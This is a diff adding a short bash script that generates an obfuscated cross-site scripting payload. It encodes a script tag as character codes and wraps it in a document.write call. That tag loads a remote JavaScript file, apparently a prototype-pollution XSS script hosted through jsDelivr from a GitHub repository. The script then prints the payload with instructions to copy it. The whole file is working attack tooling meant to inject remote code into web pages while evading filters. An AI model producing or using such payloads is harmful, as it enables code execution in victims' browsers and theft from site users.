@@ -1,0 +1,19 @@
+#!/bin/bash
+
+# Your GitHub URL via jsDelivr
+URL="https://cdn.jsdelivr.net/gh/yossefsabry/_scripts@main/qjuery_pollution_xss.js"
+
+# The full script tag we want to write to the document
+FULL_TAG="<script src='$URL'></script>"
+
+# Convert the WHOLE TAG to CharCodes
+CODES=$(python3 <<EOF
+import sys
+payload = "$FULL_TAG"
+print(','.join([str(ord(c)) for c in payload]))
+EOF
+)
+
+echo "--- COPY EVERYTHING BELOW THIS LINE ---"
+echo "<script>document.write(String.fromCharCode($CODES))</script>"
+echo "--- END OF PAYLOAD ---"
